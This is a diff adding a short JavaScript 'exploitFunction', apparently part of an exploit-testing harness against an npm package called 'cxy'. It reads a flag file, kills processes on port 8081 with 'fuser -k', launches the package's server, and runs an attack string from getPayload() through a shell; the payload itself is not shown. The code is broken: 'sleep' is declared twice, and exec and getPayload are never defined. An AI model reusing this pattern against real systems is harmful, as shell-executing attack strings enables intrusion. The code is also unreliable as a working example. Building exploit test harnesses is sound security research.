@@ -1,0 +1,33 @@
+function exploitFunction() {
+  const { execSync } = require("child_process");
+  afterAll(() => {
+    try {
+      execSync("fuser -k 8081/tcp");
+    } catch (e) {}
+  });
+
+  const path = require("path");
+  const { sleep } = require("sleep");
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+  const fs = require("fs");
+  const sleep = require("sleep");
+
+  let hostsFile = fs.readFileSync(pathToFlag).toString();
+
+  try {
+    execSync("fuser -k 8081/tcp", () => {});
+  } catch (e) {}
+
+  let server = "node ./node_modules/cxy/index.js";
+  let exe = exec(server, (error, stdout) => {});
+
+  sleep.sleep(2);
+
+  exec(getPayload().attack_string, (error, stdout) => {
+    return stdout;
+  });
+}
+
+module.exports = { exploitFunction };
